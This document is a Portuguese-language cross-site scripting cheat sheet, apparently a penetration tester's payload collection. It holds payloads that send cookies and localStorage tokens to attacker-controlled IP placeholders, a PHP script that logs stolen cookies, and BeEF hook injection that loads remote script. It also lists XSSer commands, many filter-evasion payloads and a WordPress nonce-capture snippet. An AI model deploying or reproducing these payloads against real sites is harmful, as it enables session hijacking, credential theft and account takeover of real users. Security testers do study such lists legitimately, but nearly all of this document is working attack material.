
## Roubo de Cookies do Local Storage 
```
document.location='http://[IP-Servidor-Externo]:8080/'+localStorage.getItem('refresh_token');

# JSON.stringify(localStorage)
<img src='https://[IP-Atacante]/yikes?jwt='+JSON.stringify(localStorage);'--!>
```

## Roubo de Cookies - Script PHP
 
```
";new Image().src="http://[IP]/roubacookie.php?c="+escape(document.cookie);//

x" onmouseover="new Image().src='http://[IP]/roubacookie.php?c='+escape(document.cookie)

x" onclick=new Image().src='http://[IP]/roubacookie.php?c='+escape(document.cookie)

"; new Audio().src="http://[IP]/roubacookie.php?c="+escape(document.cookie);//

240' src=x onerror="new Audio().src='http://[IP]/roubacookie.php?c="+escape(document.cookie)

## Script 

<?php

error_reporting(0);

$cookie = $_GET['c'];

$file = '_c_.txt';
$handle = fopen($file,"a");
fwrite($handle,$cookie."\n");
fclose($handle);

echo '<h1>Pagina de Teste</h1>';>
```

## XSS Defecement
```
# Não Persistente

<script> document.body.innerHTML="<img src='http://[IP]/imagem.png'>" </script>
```

## XSS Keylogger<p>
Metasploit Módulo: auxiliary/server/capture/http_javascript_keylogger

## XSSer Tool
```

# POST

xsser --url '[URL]' -p '[campo]=XSS&[campo]=[valor]'

xsser --url '[URL]' -p '[campo]=XSS&[campo]=[valor]' --auto

xsser --url '[URL]' -p '[campo]=XSS&[campo]=[valor]' --Fp "<script>alert(1)</script>"

# GET

xsser --url "[URL]?[campo]=[valor]&[campo]=[valor]&[campo]=XSS&[campo]=[valor]&[campo]=[valor]"

xsser --url "[URL]?[campo]=[valor]&[campo]=[valor]&[campo]=XSS&[campo]=[valor]&[campo]=[valor]" --auto
```

## XSS Keylogger com BeF
```
<img/src=x style="display:nome" onerror="s=docment.createElement('script');s.setAttribute('src','http://[IP-BEFF]:[PORT]/hook.js');document.head.appendChild(s)">

<script src="http://[IP-BEFF]:[PORT]/hook.js"></script>
```

## XSS Stored
```
<span onmouseover="console.info("teste")">Teste</span>
```

## XSS Evasion
```
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;()&rpar;">X</a>

<img src=x onerror=alert(document.cookie);>

<iframe src=javascript:alert('teste')//

<embed src=javascript:alert('teste')>

<script/random>alert('teste');</script>

<ScRiPt>alert('teste');</ScRiPt>

<ScRiPt>alert('teste');

<script
>alert('teste');</script>

<scr<script>ipt>alert('teste')</scr<script>ipt>

<scr\x00ipt>alert('teste')</src\x00ipt>

## HTML Attributes

<a href="javascript:alert('teste')">Teste</a>

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Teste</a>

<form id=x></form><button form="x" formaction="javascript:alert('teste')">Teste</button>

<form id=x></form><button form="x" formaction="javascript:alert('teste')">Teste</button>

</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`teste` //>#

</Title/</script/><img src=x onerror="\u0061lert('teste')"/>#

</script><svg onload="eval(atob('YWxlcnQoJ2wzM3QnKQ=='))"> 

</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`teste` //>#

</Title/</script/><img src=x onerror="\u0061lert('teste')"/>#

</Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`teste` //>#

<object data="javascript:alert('teste')">

<script>\u0061lert('teste')</script>

<img src=x onerror="&#x0061;lert('teste')"/>

<img src=x onerror="&#97;lert('teste')"/>

<object data="javascript:alert('teste')">

<object data="data:text/html,<script>alert('teste')</script>">

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<object data="//[URL-Attacker/xss.swf">

<embed code="//[URL-Attacker/xss.swf" allowscriptaccess=always>

Script xss.swf = https://github.com/evilcos/xss.swf

## HTML Events

<body onload=alert('teste')>

<input type=image src=x:x onerror=alert('teste')>

<isindex onmouseover="alert('teste')" >

<form oninput=alert('teste')><input></form>

<textarea autofocus onfocus=alert('teste')>

<input oncut=alert('teste')>

<svg onload=alert('teste')>

<keygen autofocus onfocus=alert('teste')>

<video><source onerror="alert('teste')">

<marquee onstart=alert('teste')>

<svg/onload=alert('teste')>

<svg//////onload=alert('teste')>

<svg id=x;onload=alert('teste')>

<svg id=`x` onload=alert('teste')>

<svg onload%09=alert('teste')>

<svg %09onload=alert('teste')>

<svg %09onload%20=alert('teste')>

<svg onload%09%20%28%2C%3b=alert('teste')>

<svg onload%0B=alert('teste')>

## Unicode Escaping

<script>\u0061lert('teste')</script>

<script>\u0061\u006C\u0065\u0072\u0074('teste')</script>

<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>

## Decimal, Octal e Hexadecimal Escaping

<img src=x onerror="&#x0061;lert('teste')"/>

<img src=x onerror="&#97;lert('teste')"/>

<img src=x onerror="eval('\a\l\ert\(teste\)')"/>

<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>

## Javascript XSS

<object data="JaVaScRiPt:alert('teste')">

<object data="javascript&colon;alert('teste')">

<object data="java
script:alert('teste')">

<object data="javascript&#x003A;alert('teste')">

<object data="javascript&#58;alert('teste')">

<object data="&#x6A;avascript:alert('teste')">

<object
data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('teste')">

<object data="data:text/html,<script>alert('teste')</script>">

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<embed code="data:text/html,<script>alert('teste')</script>">

<embed code="DaTa:text/html,<script>alert('teste')</script>">

<embed code="data&colon;text/html,<script>alert('teste')</script>">

<embed code="data&#x003A;text/html,<script>alert('teste')</script>">

<embed code="&#x64;&#x61;ta:text/html,<script>alert('teste')</script>">

## XSS IE

# IE8
<img src=a onerror="vbscript:msgbox 1"/>

<img src=b onerror="vbs:msgbox 2"/>

# IE Edge
<img src=c onerror="vbs:alert('teste')"/>

<img src=d onerror="vbscript:alert('teste')"/>

<img src=x onerror="vbscript&#x003A;alert('teste')">

<img src=x onerror="vb&#x63;cript:alert('teste')">
```

## Special Caracters
```
"<" ">" usado para elementos/componentes no HTML

"{" "}" usado para declarar uma função

'' "" usado para definir string

; final do bloco de código
```

## XSS Captura de Token
```
## Exemplo
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php"; ### Faz o request
var nonceRegex = /ser" value="([^"]*?)"/g; ### Captura o token entre o recurso /ser e value de acordo com o regex alfanumérico
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
